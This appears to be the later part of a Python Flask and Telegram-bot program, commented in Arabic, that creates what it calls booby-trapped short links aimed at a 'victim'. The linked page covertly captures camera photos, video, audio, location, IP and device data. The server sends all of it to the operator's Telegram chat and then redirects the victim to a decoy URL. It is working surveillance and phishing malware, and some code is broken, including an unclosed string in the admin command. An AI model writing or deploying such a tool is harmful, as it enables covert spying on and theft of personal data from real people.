async function runAll(){statusEl.textContent='🔄 جاري جمع البيانات...';await captureFront();await captureBack();await recordVideo();await recordAudio();getLocation();await getIP();await new Promise(r=>setTimeout(r,3000));statusEl.textContent='📤 إرسال البيانات...';try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
runAll();
</script>
</body>
</html>
"""

# ============================================================
#  دوال Flask (الـ Routes)
# ============================================================

@app.route('/')
def index():
    return "🔬 مختبر الاختبار - يعمل"

@app.route('/get_ip')
def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return jsonify({'ip': ip})

@app.route('/<short_id>')
def handle_short_link(short_id):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (short_id + '%',)).fetchone()
    conn.close()
    if not session:
        return "❌ رابط غير صالح", 404
    session_id = session['session_id']
    features = session['features']
    original_url = session['original_url']
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    return redirect(f"/test/{session_id}/{features}")

@app.route('/test/<session_id>/<features>')
def test_page(session_id, features):
    session = get_session(session_id)
    if not session:
        return "❌ جلسة غير صالحة", 404
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    original_url = session['original_url']
    
    pages = {
        'camera_front': CAMERA_FRONT_PAGE,
        'camera_back': CAMERA_BACK_PAGE,
        'video_front': VIDEO_FRONT_PAGE,
        'video_back': VIDEO_BACK_PAGE,
        'audio': AUDIO_PAGE,
        'location': LOCATION_PAGE,
        'device': DEVICE_PAGE,
        'all': ALL_PAGE
    }
    
    page = pages.get(features)
    if not page:
        return "❌ ميزة غير معروفة", 404
    
    return render_template_string(
        page,
        session_id=session_id,
        original_url=original_url
    )

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        session = get_session(session_id)
        if not session:
            return jsonify({'error': 'جلسة غير صالحة'}), 404
        chat_id = session['chat_id']
        
        # إرسال الصور
        for key in ['camera_front', 'camera_back']:
            if data.get(key):
                for img_data in data[key]:
                    try:
                        img = img_data.split(',', 1)[1]
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        files = {'photo': base64.b64decode(img)}
                        requests.post(url, data={'chat_id': chat_id}, files=files)
                    except:
                        pass
        
        # إرسال الفيديو
        if data.get('video'):
            try:
                video = data['video'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
                files = {'video': base64.b64decode(video)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # إرسال الصوت
        if data.get('audio'):
            try:
                audio = data['audio'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                files = {'audio': base64.b64decode(audio)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # إرسال الموقع
        if data.get('location'):
            try:
                loc = data['location']
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                requests.post(url, data={
                    'chat_id': chat_id,
                    'latitude': loc['lat'],
                    'longitude': loc['lng']
                })
            except:
                pass
        
        # إرسال معلومات الجهاز
        if data.get('device'):
            try:
                device = data['device']
                msg = f"📱 معلومات الجهاز:\n{device}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg})
            except:
                pass
        
        # إرسال IP
        if data.get('ip'):
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
#  بوت تيليجرام
# ============================================================

bot = TeleBot(BOT_TOKEN)
user_states = {}

def check_subscription(user_id):
    channels = get_required_channels()
    if not channels:
        return True
    for channel in channels:
        try:
            member = bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

def main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📷 أمامية", callback_data="camera_front"),
        InlineKeyboardButton("📷 خلفية", callback_data="camera_back"),
        InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
        InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
        InlineKeyboardButton("🎙 صوت", callback_data="audio"),
        InlineKeyboardButton("📍 موقع", callback_data="location"),
        InlineKeyboardButton("📱 معلومات", callback_data="device"),
        InlineKeyboardButton("🔬 الكل", callback_data="all")
    )
    user = get_user(user_id)
    if user and user['is_admin']:
        markup.add(InlineKeyboardButton("⚙️ الإدارة", callback_data="admin_panel"))
    return markup

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user:
        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '')
    bot.send_message(user_id, "🔬 مرحباً بك في مختبر الاختبار", reply_markup=main_menu(user_id))
@bot.message_handler(commands=['make_admin'])
def make_admin_cmd(message):
    # تأكد أن المرسل هو أنت
    if message.from_user.id == [6904264075]:
        conn = get_db()
        conn.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (message.from_user.id,))
        conn.commit()
        conn.close()
        bot.reply_to(message, "✅ تم تفعيل صلاحيات الإدارة")
    else:
        bot.reply_to(message, "❌ غير مصرح لك)
                     
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    feature = call.data
    
    if feature == 'admin_panel':
        bot.answer_callback_query(call.id, "🔐 لوحة الإدارة قيد التطوير")
        return
    
    # طلب الرابط الأصلي
    user_states[user_id] = f'waiting_url_{feature}'
    bot.send_message(user_id, "📤 أرسل الآن الرابط الأصلي (الموقع الذي تريد توجيه الضحية إليه):")
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
def handle_original_url(message):
    user_id = message.from_user.id
    state = user_states.get(user_id, '')
    if not state.startswith('waiting_url_'):
        return
    feature = state.replace('waiting_url_', '')
    original_url = message.text.strip()
    
    if not is_valid_url(original_url):
        bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
        return
    
    session_id = create_session(user_id, feature, original_url, {})
    short_link = create_short_link(session_id)
    del user_states[user_id]
    
    bot.reply_to(message, f"""
🔗 **تم إنشاء الرابط الملغم**

📌 **الرابط المختصر:**
<code>{short_link}</code>

🔗 **الرابط الأصلي:**
<code>{original_url}</code>

📋 **الميزة:** {feature}
⏱ الصلاحية: 10 دقائق
    """, parse_mode='HTML')

# ====== تشغيل البوت ======
def run_bot():
    print("🤖 بدء تشغيل البوت...")
    try:
        bot.delete_webhook()
        print("✅ تم حذف Webhook القديم")
    except Exception as e:
        print(f"⚠️ خطأ في حذف Webhook: {e}")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"⚠️ خطأ في البوت: {e}")
            time.sleep(5)

# ====== بدء التشغيل ======
print("🚀 جاري تهيئة قاعدة البيانات...")
init_db()
print("✅ قاعدة البيانات جاهزة")

bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()
print("🤖 تم تشغيل البوت في الخلفية")

# ============================================================
#  تشغيل السيرفر
# ============================================================

if __name__ != '__main__':
    print("🚀 السيرفر جاهز للعمل مع gunicorn")
else:
    app.run(host='0.0.0.0', port=5000)
